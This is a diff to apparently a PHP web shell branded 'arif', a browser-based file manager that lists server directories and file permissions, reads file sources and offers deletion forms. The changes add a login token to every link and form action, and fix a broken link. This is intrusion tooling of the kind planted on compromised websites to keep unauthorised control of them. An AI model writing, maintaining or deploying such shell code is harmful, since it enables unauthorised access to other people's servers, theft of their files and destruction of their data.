@@ -244,11 +244,11 @@ $paths = explode('/',$path);
 foreach($paths as $id=>$pat){
 if($pat == '' && $id == 0){
 $a = true;
-echo '<a href="?path=/">/</a>';
+echo '<a href="?login='.$arif.'&path=/">/</a>';
 continue;
 }
 if($pat == '') continue;
-echo '<a href="?path=';
+echo '<a href="?login='.$arif.'&path=';
 for($i=0;$i<=$id;$i++){
 echo "$paths[$i]";
 if($i != $id) echo "/";
@@ -286,7 +286,7 @@ $path = $_GET['path'];
 }else{
 $path = getcwd();
 }
-$path = str_replace('\\','/',$path);
+$path = str_replace('\\','/',$path,);
 $paths = explode('/',$path);
 echo "<hr><center class='arif_table'>
 <a href='?' class='arif_table'>Home</a>
@@ -1655,7 +1655,7 @@ echo '<div id="content"><table width="780" border="0" cellpadding="3" cellspacin
 foreach($scandir as $dir){
 if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
 echo '<tr>
-<td><img src="data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs="><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
+<td><img src="data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs="><a href="?path='.$path.'/'.$dir.'&login='.$arif.'">'.$dir.'</a></td>
 <td><center>--</center></td>
 <td><center>';
 if(is_writable($path.'/'.$dir)) echo '<font color="blue">';
@@ -1663,7 +1663,7 @@ elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
 echo perms($path.'/'.$dir);
 if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';
 echo '</center></td>
-<td><center><form method="POST" action="?option&path='.$path.'">
+<td><center><form method="POST" action="?option&path='.$path.'&login='.$arif.'">
 <select name="opt" style="margin-top:6px;width:120px;font-family:Kelly Slab;font-size:15;background:transparent;color:#15CFF4;border:2px solid #15CFF4;border-radius:5px">
 <option value="">Select</option>
 <option value="delete">Delete</option>
@@ -1689,7 +1689,7 @@ $size = $size.' KB';
 }
 
 echo '<tr>
-<td><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII="> <a href="?filesrc=<a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
+<td><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII="> <a href="?filesrc='.$path.'/'.$file.'&path='.$path.'&login='.$arif.'">'.$file.'</a></td>
 <td><center>'.$size.'</center></td>
 <td><center>';
 if(is_writable($path.'/'.$file)) echo '<font color="blue">';
@@ -1697,7 +1697,7 @@ elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
 echo perms($path.'/'.$file);
 if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
 echo '</center></td>
-<td><center><form method="POST" action="?option&path='.$path.'">
+<td><center><form method="POST" action="?option&path='.$path.'&login='.$arif.'">
 <select name="opt" style="margin-top:6px;width:120px;font-family:Kelly Slab;font-size:15;background:transparent;color:#15CFF4;border:2px solid #15CFF4;border-radius:5px">
 <option value="">Select</option>
 <option value="delete">Delete</option>
